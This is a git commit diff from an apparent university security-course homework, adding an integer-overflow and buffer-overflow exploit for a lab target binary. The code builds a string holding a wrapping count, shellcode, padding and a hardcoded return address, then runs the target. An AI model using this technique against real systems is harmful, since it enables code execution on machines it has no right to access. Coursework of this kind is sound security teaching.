37bb48d2d0b524e3c6a617301d307ce0e9d3e343
GarrettBoulais <gboulais@ucsd.edu>
2019-04-24 23:13:50 -0700

    finished exploit3

--- hw2/sploits/sploit3.c
+++ hw2/sploits/sploit3.c
@@ -6,14 +6,47 @@
 
 #define TARGET "/tmp/target3"
 
+// buf is 554*32 bytes, we will overwrite next 32 bytes
+#define STR_SIZE (555*32) // hex value is 0x22B
 int main(void)
 {
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  args[0] = TARGET; args[2] = NULL;
   env[0] = NULL;
+  
+  // (badInt*32)/32 = 555
+  char * badInt = "2147484203,"; 
+  char badStr[STR_SIZE];
 
+  int i = 0;
+  // add our large number to the string
+  for(i = 0; i < 11; i++) {
+      badStr[i] = badInt[i];
+  }
+  int shIndex = 0;
+  // add shellcode to our string
+  for(i; i < 11 + 45; i++) {
+      badStr[i] = shellcode[shIndex++];
+  }
+  // fill bytes up until we hit the eip
+  for(i; i < STR_SIZE - 1 - 8; i++) {
+   badStr[i] = 0x22;
+  }
+
+  // overwrite eip
+  *((int *) (badStr +i)) = 0xbfff7390;
+  i+=4; // eip takes four bytes
+  // fill remainder of buf up. end with null char
+  for(i; i < STR_SIZE-1;i++) {
+   badStr[i] = 0x22;
+   printf("here\n");
+  }
+  badStr[STR_SIZE-1] = 0x00; 
+  // add string to args list
+  args[1] = badStr;
+  // execute
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
 
